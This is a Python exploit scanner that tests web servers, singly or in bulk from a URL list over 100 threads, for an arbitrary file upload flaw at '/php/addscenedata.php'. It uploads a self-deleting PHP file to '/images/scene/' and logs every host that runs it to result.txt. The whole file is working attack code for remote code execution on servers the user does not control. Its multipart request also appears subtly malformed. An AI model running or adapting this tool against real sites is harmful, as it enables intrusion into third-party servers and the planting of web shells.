import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

███████╗██████╗  ██████╗ ███╗   ██╗██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
██╔════╝██╔══██╗██╔═══██╗████╗  ██║██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
███████╗██████╔╝██║   ██║██╔██╗ ██║██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
███████║██║     ╚██████╔╝██║ ╚████║╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝                                                                                                                                                                                                                                                                   
                                                           
                                                                    version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/php/addscenedata.php"
    url = target+payload_url
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Content-Length': '279',
        'Content-Type': 'multipart/form-data; boundary=b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close'
    }
    data = (
        "--b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b\r\n"
        'Content-Disposition: form-data; name="upload"; filename="test.php"\r\n'
        'Content-Type: application/octet-stream\r\n'

        "<?php echo 'zc-blog';unlink(__FILE__);?>\r\n"
        "--b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b--"
    )
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        url2 = target+"/images/scene/test.php"
        res2 = requests.get(url2, verify=False)
        if res.status_code == 200 and res2.status_code == 200 and 'zc-blog' in res2.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()